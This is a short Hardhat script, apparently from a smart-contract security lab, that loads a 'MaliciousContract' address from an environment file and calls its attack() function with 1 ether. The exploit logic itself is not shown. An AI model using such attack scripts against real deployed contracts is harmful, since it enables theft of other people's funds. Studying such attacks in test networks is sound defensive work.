require('dotenv').config();
const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();
    console.log("Attacking with the account:", attacker.address);

    const maliciousContractAddress = process.env.MALICIOUS_CONTRACT_ADDRESS;

    if (!maliciousContractAddress) {
        console.error("Error: MALICIOUS_CONTRACT_ADDRESS not defined in .env file.");
        process.exit(1);
    }

    const MaliciousContract = await ethers.getContractAt("MaliciousContract", maliciousContractAddress);

    // Amount to attack with (specify the amount in wei)
    const attackAmount = ethers.utils.parseEther("1.0"); // Example: attacking with 1 ether

    // Execute the attack
    const tx = await MaliciousContract.attack(attackAmount, { value: attackAmount });

    // Wait for the transaction to be mined
    await tx.wait();

    console.log("Attack executed successfully. Transaction Hash:", tx.hash);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error("Error executing attack:", error);
        process.exit(1);
    });
